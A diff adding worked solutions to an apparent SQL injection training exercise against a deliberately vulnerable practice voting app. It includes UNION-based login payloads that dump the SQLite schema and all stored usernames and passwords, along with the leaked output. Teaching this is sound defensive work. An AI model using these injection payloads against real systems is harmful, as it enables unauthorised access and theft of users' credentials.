@@ -56,4 +56,59 @@ The login form is still vulnerable. Focus on the username field. A single quote 
   Once you know the users table name and columns, you can concatenate username and password fields with the string concatenation operator [`||`](https://www.sqlite.org/lang_expr.html#operators_and_parse_affecting_attributes) inside `GROUP_CONCAT`.
 </details>
 
+## Solutions
+
+<details>
+  <summary>Solution for 6.1</summary>
+
+  With the username from the exercise, the login query becomes:
+
+  ```sql
+  SELECT id FROM user WHERE username='' UNION ALL SELECT GROUP_CONCAT(sql) as id FROM sqlite_schema--' AND password=''
+  ```
+
+  - No user has an empty username, so the first `SELECT` returns no rows.
+  - The second `SELECT` returns one row: the `CREATE` statements of all tables, joined into one string and named `id`.
+  - `--` comments out the password check.
+
+  The app thinks the login succeeded and stores the "id" in the session as the logged-in user. The voting page writes it into the hidden `userId` field of the comment form, so the page source shows:
+
+  ```html
+  <input type="hidden" name="userId" value="CREATE TABLE candidate (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      name text not null,
+      votes text not null default 0
+    ),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE user (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      username text not null,
+      password test not null,
+      hasVoted bool not null default false
+    ),CREATE TABLE comment (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      author text not null,
+      comment text not null
+    )" />
+  ```
+
+  Now you know there's a `user` table with `username` and `password` columns. (`sqlite_sequence` is an internal table SQLite creates for `AUTOINCREMENT`.)
+</details>
+
+<details>
+  <summary>Solution for 6.2</summary>
+
+  Log in with this username (any password):
+
+  ```sql
+  ' UNION ALL SELECT GROUP_CONCAT(username || ':' || password) as id FROM user--
+  ```
+
+  The hidden `userId` field on the voting page now contains every username and password:
+
+  ```
+  jim_raynor:terran_rox,sarah_kerrigan:zergs_r0ckz!,zeratul:hunter3,user:user
+  ```
+
+  This is why passwords must never be stored in plain text: one SQL injection exposes all of them.
+</details>
+
 ### [Go to exercise 7 :arrow_right:](../exercise-7/README.md)
